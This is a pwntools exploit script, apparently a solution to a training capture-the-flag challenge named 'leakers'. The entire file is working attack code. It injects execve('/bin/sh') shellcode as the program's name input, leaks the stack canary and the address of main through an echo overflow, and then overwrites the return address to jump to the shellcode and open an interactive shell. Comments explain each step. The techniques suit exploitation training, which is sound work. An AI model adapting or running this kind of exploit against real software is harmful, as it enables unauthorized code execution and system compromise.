
from pwn import *

COMMANDS = """
brva 0x12f9
c
"""

chall_path = "./leakers"
chall = ELF(chall_path)

context.arch = "amd64"

shellcode_in_ps1 = '''
    xor rax, rax
    mov rax, 0x3b
    xor rdi, rdi
    mov rdi, 0x0068732f6e69622f 
    push rdi
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall
'''

if args.REMOTE:
    c = remote("leakers.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./leakers" , gdbscript=COMMANDS)
    else:
        c = process("./leakers")

###################################  sending the shellcode as 'name' ############################
c.recvuntil(b"name?\n")
c.sendline(asm(shellcode_in_ps1))

###################################  leaking the canary value ##################################

payload = b"\x42" * 105               #we provide 105 'A' as input
c.recvuntil(b"Echo: ")
c.send(payload)


c.recvuntil(payload) # the program returns back what we have sent, so we wait for our payload

#when we have received our payload, since we have overwritten the last byte (00) of the canary, the canary itself will we printed,
#so we recv the next 7 bytes (of the canary indeed) and we construct the canary;
canary = b"\x00" + c.recv(7)
print("canary: ", hex(u64(canary))) #u64 transform 8 bytes into an integer and then, with 'hex', we transform into hexadecimal

##################################  leaking the memory address of main ########################

payload = b"A" * (104 + 6 * 8)      #through the first 104 we reach the canary and with 48 more (6*8) we reach the address to leak
c.recvuntil(b"Echo: ")
c.send(payload)

c.recvuntil(payload)                #we receive all the 152 'A's we have sent and, after that, we receive only 6 bytes of the virtual address we want to leak
leak = c.recv(6).ljust(8, b"\x00")

##################################  finding  the address of ps1    ############################
chall.address = u64(leak) - chall.symbols["main"]

payload = b"A" * 104                          # reach the canary from the beginning of the echostring buffer
payload = payload + canary                    # overwrite the canary with its correct value
payload = payload + b"A" * 8                  # overwrite the saved RBP
payload = payload + p64(chall.symbols["ps1"]) # p64 makes a number a sequence of exactly 8 bytes, invert of u64 

c.recvuntil(b"Echo: ")
c.send(payload)

c.interactive()